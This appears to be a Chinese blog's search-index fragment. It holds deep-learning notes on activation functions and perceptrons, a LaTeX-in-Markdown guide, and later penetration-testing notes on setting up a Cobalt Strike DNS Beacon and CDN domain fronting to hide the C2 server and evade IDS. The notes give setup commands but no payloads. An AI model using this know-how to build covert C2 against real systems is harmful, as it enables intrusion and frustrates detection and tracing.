","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:4:8","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"9.Dice https://zhuanlan.zhihu.com/p/455474500 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:4:9","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"如何选择合适的激活函数(how) 传统的激活函数选择的建议： 优先relu 再考虑prelu、leaky relu、maxout 再考虑tanh 除非用作二分类的最后一层，其他一般不建议使用sigmoid 这个问题目前没有确定的方法，凭一些经验吧: 深度学习往往需要大量时间来处理大量数据，模型的收敛速度是尤为重要的。所以，总体上来讲，训练深度学习网络尽量使用zero-centered数据 (可以经过数据预处理实现) 和zero-centered输出。所以要尽量选择输出具有zero-centered特点的激活函数以加快模型的收敛速度。 如果使用 ReLU，那么一定要小心设置 learning rate，而且要注意不要让网络出现很多 “dead” 神经元，如果这个问题不好解决，那么可以试试 Leaky ReLU、PReLU 或者 Maxout. 最好不要用sigmoid，你可以试试tanh，不过可以预期它的效果会比不上 ReLU 和 Maxout. ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:5:0","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"参考 https://blog.csdn.net/qq_18310041/article/details/91042085 https://blog.csdn.net/tyhj_sf/article/details/79932893 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:6:0","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"简介 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:1:0","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"前言 感知机是由美国学者Frank Rosenblatt在1957年提出来的，是神经网络和支持向量机的基础。 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:1:1","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"感知机模型 感知机是什么？ 感知机接收多个输入信号，输出一个信号。 和电流向前传输一样，不过感知机的信号只有“流/不流”（1/0）两种取值。这里，0对应“不传递信号”，1对应“传递信号”。 对感知机模型进行拆解： 1.输入部分 2.权重(就是w向量) 3.偏置 5.加权 6.输出 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:1:2","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"感知机原理 如上图1是一个接收两个输入信号的感知机的例子。x1、x2是输入信号， y是输出信号，w1、w2是权重（w是weight的首字母）。图中的○称为“神 经元”或者“节点”。输入信号被送往神经元时，会被分别乘以固定的权重$(\\omega_1x_1、\\omega_1x_1)$ 神经元会计算传送过来的信号的总和，只有当这个总和超过了某个界限值时，才会输出1。这也称为“神经元被激活”。 这里将这个界限值称为阈值，用符号θ表示。 以上就是感知机的原理，用数学式1表示如下： $$ y = \\begin{cases} 0 \u0026 \\omega_1x_1 + \\omega_2x_2 \\le \\theta \\ 1 \u0026 \\omega_1x_1 + \\omega_2x_2 \u003e \\theta \\end{cases} $$ 感知机的多个输入信号都有各自固有的权重，这些权重发挥着控制各个 信号的重要性的作用。也就是说，权重越大，对应该权重的信号的重要性就越高。 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:1:3","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"简单逻辑电路 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:2:0","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"与门(AND gate) 与门是有两个输入和一个输出的门电路，与门仅在两个输入均为1时输出1，其他时候则输出0，如下图（就跟我们学习C语言时候的与或非是一样的） 下面考虑用感知机来表示这个与门 实际上，满足图2的条件的参数的选择方法有无数多个。比如，当(w1, w2, θ) = (0.5, 0.5, 0.7) 时，可以满足图 2的条件。此外，当 (w1, w2, θ) 为(0.5, 0.5, 0.8)或者(1.0, 1.0, 1.0)时，同样也满足与门的条件。设定这样的 参数后，仅当x1和x2同时为1时，信号的加权总和才会超过给定的阈值θ。 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:2:1","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"与非门(NAND gate) NAND是Not AND的意思，与非门就是颠倒了与门的输出。用真值表表示的话，如下图，仅当x1和x2同时为1时输出0，其他时候则输出1： 要表示与非门，可以用(w1, w2, θ) = (−0.5, −0.5, −0.7)这样的组合（其他的组合也是无限存在的）。实际上，只要把实现与门的参数值的符号取反，就可以实现与非门。 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:2:2","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"或门 或门是“只要有一个输入信号是1，输出就为1”的逻辑电路。 那么我们来思考一下，应该为这个或门设定什么样的参数呢？ 根据上述，我们可以知道：与门、与非门、或门的感知机构造是一样的。 实际上，3个门电路只有参数的值（权重和阈值）不同。也就是说，相同构造的感知机，只需通过适当地调整参数的值，就可以像“变色龙演员”表演不同的角色一样，变身为与门、与非门、或门。 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:2:3","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"感知机的实现 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:3:0","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"简单的实现 我们先来简单实现上述的逻辑电路。 我们先定义一个接收参数x1和x2的AND函数: # 与门 def AND(x1, x2): w1, w2, theta = 0.5, 0.5, 0.7 tmp = x1*w1 + x2*w2 if tmp \u003c= theta: return 0 elif tmp \u003e theta: return 1 在函数内初始化$\\omega_1、\\omega_2、\\theta$，当输入的加权总和超过阈值时返回1，否则返回0。 以上我们就实现了与门，同理我们也可以实现非门和或门 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:3:1","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"使用权重和偏置的实现 刚才的与门的实现比较直接、容易理解，但是考虑到以后的事情，我们将其修改为另外一种实现形式。在此之前，首先把式1的θ换成−b，于是就可以用式2来表示感知机的行为。 $$ y = \\begin{cases} 0 \u0026 b + \\omega_1x_1 + \\omega_2x_2 \\le \\theta \\ 1 \u0026 b + \\omega_1x_1 + \\omega_2x_2 \u003e \\theta \\end{cases} $$ 此处，b称为偏置，w1和w2称为权重。 感知机会计算输入信号和权重的乘积，然后加上偏置，如果这个值大于0则输出1，否则输出0 使用权重和偏置，可以像下面这样实现与门： def AND(x1, x2): x = np.array([x1, x2]) w = np.array([0.5, 0.5]) b = -0.7 tmp = np.sum(w*x) + b # w*x是相同位置各个元素分别相乘，np.sum(w*x)再计算相乘后的各个元素的总和，最后再把偏置加到这个加权总和上 if tmp \u003c= 0: return 0 else: return 1 在这里，w1和w2是控制输入信号的重要性的参数，而偏置是调整神经元被激活的容易程度（输出信号为1的程度）的参数。 比如，若b为 −0.1，则只要输入信号的加权总和超过0.1，神经元就会被激活。但是如果b 为−20.0，则输入信号的加权总和必须超过20.0，神经元才会被激活。像这样，偏置的值决定了神经元被激活的容易程度。另外，这里我们将w1和w2称为权重，将b称为偏置，但是根据上下文，有时也会将b、w1、w2这些参数统称为权重。 实现与非门： def NAND(x1, x2): x = np.array([x1, x2]) w = np.array([-0.5, -0.5]) # 仅权重和偏置与AND不同！ b = 0.7 tmp = np.sum(w * x) + b if tmp \u003c= 0: return 0 else: return 1 实现或门： def OR(x1, x2): x = np.array([x1, x2]) w = np.array([0.5, 0.5]) # 仅权重和偏置与AND不同！ b = -0.2 tmp = np.sum(w * x) + b if tmp \u003c= 0: return 0 else: return 1 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:3:2","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"感知机的局限 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:4:0","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"异或门： 异或门也被称为逻辑异或电路。如下图所示，仅当x1或x2中的一方为1时，才会输出1（“异或”是拒绝其他的意思）。那么，要用感知机实现这个异或门的话，应该设定什么样的权重参数呢？ 实际上，用前面介绍的感知机是无法实现这个异或门的。Why? 首先，我们试着将或门的动作形象化。或门的情况下，当权重参数(b, w1, w2) = (−0.5, 1.0, 1.0)时，可满足上图的真值表条件。此时，感知机可用下面的式子表示。 $$ y = \\begin{cases} 0 \u0026 -0.5 + x_1 + x_2 \\le 0 \\ 1 \u0026 -0.5 + x_1 + x_2 \u003e 0 \\end{cases} $$ 上面表示的感知机会生成由直线−0.5 + x1 + x2 = 0分割开的两个空 间。其中一个空间输出1，另一个空间输出0，如图： 或门在(x1, x2) = (0, 0)时输出0，在(x1, x2)为(0, 1)、(1, 0)、(1, 1)时输出1。上图中，○表示0，△表示1。如果想制作或门，需要用直线将图中的○和△分开。实际上，刚才的那条直线就将这4个点正确地分开了。 那么，换成异或门的话会如何呢？能否像或门那样，用一条直线作出分 割图2-7中的○和△的空间呢？ 想要用一条直线将图2-7中的○和△分开，无论如何都做不到。事实上，用一条直线是无法将○和△分开的。 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:4:1","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"线性/非线性 上图的○和△无法用一条直线分开，但是如果将“直线”这个限制条件去掉，就可以实现了。比如，我们可以像上上个图那样，作出分开○和△的空间。 感知机的局限性就在于它只能表示由一条直线分割的空间。上图这样弯曲的曲线无法用感知机表示。另外，由上图这样的曲线分割而成的空间称为 非线性空间，由直线分割而成的空间称为线性空间。 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:4:2","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"多层感知机 感知机不能表示异或门让人深感遗憾，但也无需悲观。实际上，感知机的绝妙之处在于它可以“叠加层”（通过叠加层来表示异或门是本节的要点） ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:5:0","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"已有电路的组合 异或门的制作方法有很多，其中之一就是组合我们前面做好的与门、与非门、或门进行配置。这里，与门、与非门、或门用下图中的符号表示。 另外，下图中与非门前端的○表示反转输出的意思 那么，思考一下，要实现异或门的话，需要如何配置与门、与非门和或门呢？ 这里，x1和x2表示输入信号，y表示输出信号。x1和x2是与非门和或门的输入，而与非门和或门的输出则是与门的输入。 我们来测试一下上图是否真正实现了异或门： 这里，把s1作为与非门的输出，把s2作为或门的输出，填入真值表中。结果如下图所示，观察x1、x2、y，可以发现确实符合异或门的输出。 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:5:1","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"异或门的实现 下面我们使用Python实现上图所示的异或门(使用之前定义的函数)： def XOR(x1, x2): s1 = NAND(x1, x2) s2 = OR(x1, x2) y = AND(s1, s2) return y 下面我们试着用感知机的表示方法（明确地显示神经元）来表示这个异或门，如下图所示，异或门是一种多层结构的神经网络。这里，将最左边的一列称为第0层，中间的一列称为第1层，最右边的一列称为第2层。 叠加了多层的感知机也称为多层感知机（multi-layered perceptron）。 上图所示的2层感知机中，先在第0层和第1层的神经元之间进行信号的传送和接收，然后在第1层和第2层之间进行信号的传送和接收，具体如下所示。 第0层的两个神经元接收输入信号，并将信号发送至第1层的神经元。 第1层的神经元将信号发送至第2层的神经元，第2层的神经元输出y。 通过这样的结构（2层结构），感知机得以实现异或门。这可以解释为“单层感知机无法表示的东西，通过增加一层就可以解决”。也就是说，通过叠加层（加深层），感知机能进行更加灵活的表示。 多层感知机（在理论上）可以表示计算机 ","date":"2022-06-29","objectID":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/:5:2","tags":["感知机","深度学习入门"],"title":"感知机(Perceptron)学习笔记","uri":"/%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron-%E5%AD%A6%E4%B9%A0/"},{"categories":["科研"],"content":"公式的两种形态 行内公式: $ \\Large \\frac{3}{12} = \\frac{1}{4}$ $\\Large \\frac{3}{12} = \\frac{1}{4}$ 行间公式： $$\\Large \\frac{3}{12} = \\frac{1}{4}$$ $$\\Large \\frac{3}{12} = \\frac{1}{4}$$ ","date":"2022-06-28","objectID":"/markdown%E4%B8%AD%E5%86%99latex/:0:1","tags":["Latex","科研"],"title":"markdown中写Latex","uri":"/markdown%E4%B8%AD%E5%86%99latex/"},{"categories":["科研"],"content":"希腊字母 ","date":"2022-06-28","objectID":"/markdown%E4%B8%AD%E5%86%99latex/:0:2","tags":["Latex","科研"],"title":"markdown中写Latex","uri":"/markdown%E4%B8%AD%E5%86%99latex/"},{"categories":["科研"],"content":"上标、下标 上标与下标分别用^和_来表示。 例如$x^2_i$表示$x^2_i$ ​ 默认情况下，^和_只对后面的一个组产生作用，如$10^10$表示$10^10$ 这时，我们可以用{...}分组。 例如$10^{10}$表示$10^{10}$ 同时，{...}还可以消除二义性。 例如$x^5^6$会引发错误，而x^{5^6}或{x^5}^6则表示$x^{5^6}x$ ","date":"2022-06-28","objectID":"/markdown%E4%B8%AD%E5%86%99latex/:0:3","tags":["Latex","科研"],"title":"markdown中写Latex","uri":"/markdown%E4%B8%AD%E5%86%99latex/"},{"categories":["科研"],"content":"数学符号 运算符 关系符 省略号 求累加 sum函数： 比如用\\sum_{i=1}^{n}e^{z_i}表示 $$\\sum_{i=1}^{n}x^i$$ 连乘 基本连乘：\\prod _{a}^{b}:$\\prod_{a}^{b} $ 角标在上边和下边的连乘\\prod \\limits_{i=1}^{n}:$\\prod \\limits_{i=1}^{n}$ 积分，正负无穷 $\\int_a^b$ 表示: $\\int_a^b$ $\\int_{- \\infty}^{+ \\infty}$表示：$\\int_{- \\infty}^{+ \\infty}$ 矢量 $\\vec {ab}$表示：$\\vec {ab}$ 偏导数 $\\partial x$ 表示：$\\partial x$ $\\frac{ \\partial f(x,y) }{\\partial x}$表示：$\\frac{ \\partial f(x,y) }{\\partial x}$ X撇 x{\\prime}表示$x{\\prime}$ $$\\pi$$ ","date":"2022-06-28","objectID":"/markdown%E4%B8%AD%E5%86%99latex/:0:4","tags":["Latex","科研"],"title":"markdown中写Latex","uri":"/markdown%E4%B8%AD%E5%86%99latex/"},{"categories":["科研"],"content":"矩阵 暂时参考：https://blog.csdn.net/bendanban/article/details/44221279 ","date":"2022-06-28","objectID":"/markdown%E4%B8%AD%E5%86%99latex/:0:5","tags":["Latex","科研"],"title":"markdown中写Latex","uri":"/markdown%E4%B8%AD%E5%86%99latex/"},{"categories":["科研"],"content":"括号 小括号/中括号 使用原始的()和[]即可。 比如用$(n+1)(n-1) = n^2-1$表示$(n+1)(n-1) = n^2-1$ 用\\left和\\right使括号能自适应括号内算式大小： 如：$(\\frac{x}{y})$表示$(\\frac{x}{y})$，而$\\left(\\frac{x}{y}\\right)$则表示$\\left(\\frac{x}{y}\\right)$括号大小不同 大括号 由于Latex中大括号默认被用于分组，所以在使用大括号前，需加上转义符号\\或使用\\lbrace和\\rbrace来表示。 比如\\{[(1+2)\\times3]\\times3\\}+2和\\lbrace[(1+2)\\times3]\\times3\\rbrace+2均表示$\\lbrace[(1+2)\\times3]\\times3\\rbrace+2$ 向上/下取整 向上取整： 分别用\\lceil和\\rceil表示上取整。 如：$\\lceil 3.5 \\rceil$表示$\\lceil 3.5 \\rceil$ 向下取整： 分别用\\lfloor和\\rfloor表示下取整 如：$\\lfloor 3.5 \\rfloor$表示$\\lfloor 3.5 \\rfloor$ 绝对值 用\\lvert和\\rvert表示绝对值，或直接使用| 如：如$\\lvert x \\rvert$或|x|表示$|x|$ ","date":"2022-06-28","objectID":"/markdown%E4%B8%AD%E5%86%99latex/:0:6","tags":["Latex","科研"],"title":"markdown中写Latex","uri":"/markdown%E4%B8%AD%E5%86%99latex/"},{"categories":["科研"],"content":"分式 简单分数 用$\\frac ab$表示$\\frac ab$,若分子与分母不是单个字符，则用{…}分组。 如：$\\frac{a+b}{c+d}$表示$\\frac{a+b}{c+d}$ 比如softmax函数的表示： $$softmax(z_i) = \\frac{e^{z_i}}{\\sum_{i=1}^{n}e^{z_i}}$$ 连分数 写连分数时，用\\cfrac代替\\frac 如：$$x=a_0 + \\cfrac{1^2}{a_1+\\cfrac{2^2}{a_2+\\cfrac{3^2}{a_3+\\cdots}}}$$ 表示 $$x=a_0 + \\cfrac{1^2}{a_1+\\cfrac{2^2}{a_2+\\cfrac{3^2}{a_3+\\cdots}}}$$ 根式 根式使用\\sqrt表示，$sqrt[x]{a+b}$表示： $\\sqrt[x]{a+b}$ 如：$\\sqrt[3]{a^3+b^3}$表示$\\sqrt[3]{a^3+b^3}$ ","date":"2022-06-28","objectID":"/markdown%E4%B8%AD%E5%86%99latex/:0:7","tags":["Latex","科研"],"title":"markdown中写Latex","uri":"/markdown%E4%B8%AD%E5%86%99latex/"},{"categories":["科研"],"content":"多行表达式 分类表达式 使用\\begin{cases}...\\end{cases}，\\\\表示分类 比如： $$ \\lvert a \\rvert = \\begin{cases} a \u0026a\u003e 0 \\\\ 0 \u0026a = 0 \\\\ -a \u0026a \u003c 0 \\end{cases} $$ 表示： $$ \\lvert a \\rvert = \\begin{cases} a \u0026a\u003e 0 \\ 0 \u0026a = 0 \\ -a \u0026a \u003c 0 \\end{cases} $$ 若想使分类间距变大，则使用\\\\[2ex],\\\\[3ex]…代替\\\\ $$ \\lvert a \\rvert = \\begin{cases} a \u0026a\u003e 0 \\\\[2ex] 0 \u0026a = 0 \\\\[2ex] -a \u0026a \u003c 0 \\end{cases} $$ $$ \\lvert a \\rvert = \\begin{cases} a \u0026a\u003e 0 \\[2ex] 0 \u0026a = 0 \\[2ex] -a \u0026a \u003c 0 \\end{cases} $$ 一行公式多行显示 用\\begin{split}...end{split}表示多行公式。 如： $$ \\begin{split} a\u0026=b+c+d \\\\ \u0026\\quad +e-f \\\\ \u0026=i \\end{split} $$ 表示： $$ \\begin{split} a\u0026=b+c+d \\ \u0026\\quad +e-f \\ \u0026=i \\end{split} $$ 方程组 用\\begin{array}...\\end{array}搭配\\left \\{...\\right.表示方程组 如： $$ \\left \\{ \\begin{array}{c} a_1x+b_1y+c_1z=d_1 \\\\ a_2x+b_2y+c_2z=d_2 \\\\ a_3x+b_3y+c_3z=d_3 \\end{array} \\right. $$ 表示： $$ \\left { \\begin{array}{c} a_1x+b_1y+c_1z=d_1 \\ a_2x+b_2y+c_2z=d_2 \\ a_3x+b_3y+c_3z=d_3 \\end{array} \\right. $$ ","date":"2022-06-28","objectID":"/markdown%E4%B8%AD%E5%86%99latex/:0:8","tags":["Latex","科研"],"title":"markdown中写Latex","uri":"/markdown%E4%B8%AD%E5%86%99latex/"},{"categories":["科研"],"content":"其它… 参考原文： https://blog.csdn.net/weixin_46885185/article/details/115017109 ","date":"2022-06-28","objectID":"/markdown%E4%B8%AD%E5%86%99latex/:0:9","tags":["Latex","科研"],"title":"markdown中写Latex","uri":"/markdown%E4%B8%AD%E5%86%99latex/"},{"categories":["渗透测试"],"content":"部署域名解析 首先，用一台公网的Linux系统的VPS作为 C\u0026C 服务器 (注意：VPS 的 53 端口一定要开放)，并准备好一个可以配置的域名 (这里我们假设是 hack.com)。然后，去配置域名的记录。 首先创建记录 A，将自己的域名www.hack.com解析到 VPS 服务器地址。 然后，创建 NS 记录，将test1.hack.com指向www.hack.com 第一条 A 类解析是在告诉域名系统，www.hack.com的 IP 地址是xx.xx.xx.xx 第二条 NS 解析是在告诉域名系统，想要知道test.hack.com的 IP 地址，就去问www.hack.com 为什么要设置 NS 类型的记录呢？因为 NS 类型的记录不是用于设置某个域名的 DNS 服务器的，而是用于设置某个子域名的 DNS 服务器的。 验证域名解析设置是否成功？ 1.验证A类解析 在随便一台电脑上 ping 域名 www.hack.com ，若能 ping 通，且显示的 IP 地址是我们配置的 VPS 的地址，说明第一条 A 类解析设置成功并已生效。 2.验证NS解析 先查看VPS的53端口是否打开： 2.1然后在我们的 VPS 上执行以下命令监听 UDP53 端口:tcpdump -n -i eth0 udp dst port 53 2.2在任意一台机器上执行nslookup test1.hack.com命令，如果在我们的 VPS 监听的端口有查询信息，说明第二条记录设置成功 ","date":"2022-06-21","objectID":"/cobalt-strike-dns-beacon/:1:0","tags":["渗透测试","防溯源","DNS Beacon","C2"],"title":"Cobalt Strike DNS Beacon","uri":"/cobalt-strike-dns-beacon/"},{"categories":["渗透测试"],"content":"CS开启监听DNS Beacon ","date":"2022-06-21","objectID":"/cobalt-strike-dns-beacon/:2:0","tags":["渗透测试","防溯源","DNS Beacon","C2"],"title":"Cobalt Strike DNS Beacon","uri":"/cobalt-strike-dns-beacon/"},{"categories":["渗透测试"],"content":"生成DNS木马 ","date":"2022-06-21","objectID":"/cobalt-strike-dns-beacon/:3:0","tags":["渗透测试","防溯源","DNS Beacon","C2"],"title":"Cobalt Strike DNS Beacon","uri":"/cobalt-strike-dns-beacon/"},{"categories":["渗透测试"],"content":"上线 只要木马在目标主机执行成功，我们的 CobaltStrike 就能接收到反弹的 shell。但是默认情况下，主机信息是黑色的。 我们需要执行以下命令，让目标主机信息显示出来 checkin mode dns-txt ","date":"2022-06-21","objectID":"/cobalt-strike-dns-beacon/:4:0","tags":["渗透测试","防溯源","DNS Beacon","C2"],"title":"Cobalt Strike DNS Beacon","uri":"/cobalt-strike-dns-beacon/"},{"categories":["渗透测试"],"content":"域前置(Domain Fronting)原理 CND分发 原理： 通过CDN节点将流量转发到真实的C2服务器，其中CDN节点IP通过识别请求的HOST头进行流量转发，利用我们配置域名的高可信度，如我们可以设置一个微软的子域名，可以有效的躲避DLP、agent等流量检测。 域前置的核心是CDN 在某 cdn 服务商开通 cdn 加速服务，并将想要伪造的域名与 c2 的 ip 进行绑定（阿里云和 cloudflare 需要验证，腾讯云不需要验证域名所属），通过向 cdn 的节点 ip 发送包含想要伪造 host 的请求，cdn 便会从记录中查找该 host 对应的源站 ip，并将流量转发至原站 ip。 比如，同一个IP可以被不同的域名进行绑定加速，例如现在有两个网站分别为www.abc.com和www.zxc.com都指定同一个IP：111.111.111.111(CDN服务器)；浏览器通过HTTP请求包里的HOST头域名进行精确访问www.abc.com还是访问www.zxc.com。比如我们ping www.xxxx.com得到一个IP，通过IP反查域名,可以看到很多域名绑定在这个IP上，这个就是CDN CDN是通过HOST来判断你要访问那个网站的 因为CND服务器可以达到隐藏真实IP的效果，所以C2服务器的真实IP可以得到隐藏保护。 ","date":"2022-06-14","objectID":"/%E5%88%A9%E7%94%A8%E5%9F%9F%E5%89%8D%E7%BD%AEcobalt-strike%E9%80%83%E9%81%BFids/:1:0","tags":["渗透测试","云函数","域前置","Domain Fronting"],"title":"利用域前置Cobalt Strike逃避IDS","uri":"/%E5%88%A9%E7%94%A8%E5%9F%9F%E5%89%8D%E7%BD%AEcobalt-strike%E9%80%83%E9%81%BFids/"},{"categories":["渗透测试"],"content":"域前置操作 1.登录腾讯云，开启CDN 2.设置CDN的域名 3.回源地址设置为VPS的地址(teamserver的真实ip) 成功添加 多地ping，查看IP是不同的，证明CDN生效了 ","date":"2022-06-14","objectID":"/%E5%88%A9%E7%94%A8%E5%9F%9F%E5%89%8D%E7%BD%AEcobalt-strike%E9%80%83%E9%81%BFids/:2:0","tags":["渗透测试","云函数","域前置","Domain Fronting"],"title":"利用域前置Cobalt Strike逃避IDS","uri":"/%E5%88%A9%E7%94%A8%E5%9F%9F%E5%89%8D%E7%BD%AEcobalt-strike%E9%80%83%E9%81%BFids/"},{"categories":["渗透测试"],"content":"配置Cobalt Strike 1.修改C2的profile配置文件的两处，指定Host使得CDN把请求转发到我们的服务器。 下载C2：https://github.com/rsmudge/Malleable-C2-Profiles/ 选择合适的profile文件，修改HOST头为准备好的域名（get和post都要改）,我这里选择了: https://github.com/rsmudge/Malleable-C2-Profiles/tree/master/normal 2.用c1lint检查一下 ./c2lint cdn.profile 3.VPS开启teamserver nohup ./teamserver xxx.xx.xx.99 qweqweqwe999 cdn.profile 4.cobaltstrike新建listener 获取cdn的节点ip，超级ping这个cname获取到cdn的节点ip 如下图设置，http hosts设置为超级ping中的多个DNS的结点IP，http host header设置为申请的高可信域名 Note: 对于下图设置我还没有经过测试不知道怎么样，有点不太理解，各种玄学问题，先去吃饭了吧😄 http hosts设置为cdn的域名，http host header设置为申请的高可信域名 6.测试通过cdn是否能指向到我们的cobalt strike curl ca.xxx.com.dsa.dnsv1.com/wcx -H “Host: ca.xxx.com” 7.生成马er，选择监听器 运行，正常上线 Note: 为了方便本文采用HTTP，但实战建议使用 https 下次再弄懂一点，现在还是不是特别懂… ","date":"2022-06-14","objectID":"/%E5%88%A9%E7%94%A8%E5%9F%9F%E5%89%8D%E7%BD%AEcobalt-strike%E9%80%83%E9%81%BFids/:3:0","tags":["渗透测试","云函数","域前置","Domain Fronting"],"title":"利用域前置Cobalt Strike逃避IDS","uri":"/%E5%88%A9%E7%94%A8%E5%9F%9F%E5%89%8D%E7%BD%AEcobalt-strike%E9%80%83%E9%81%BFids/"},{"categories":["渗透测试"],"content":"参考文章 https://mp.weixin.qq.com/s/8GBoKP3QWb0NpdllIi_YCg https://co0ontty.github.io/2021/04/29/domain_fronting.html ","date":"2022-06-14","objectID":"/%E5%88%A9%E7%94%A8%E5%9F%9F%E5%89%8D%E7%BD%AEcobalt-strike%E9%80%83%E9%81%BFids/:4:0","tags":["渗透测试","云函数","域前置","Domain Fronting"],"title":"利用域前置Cobalt 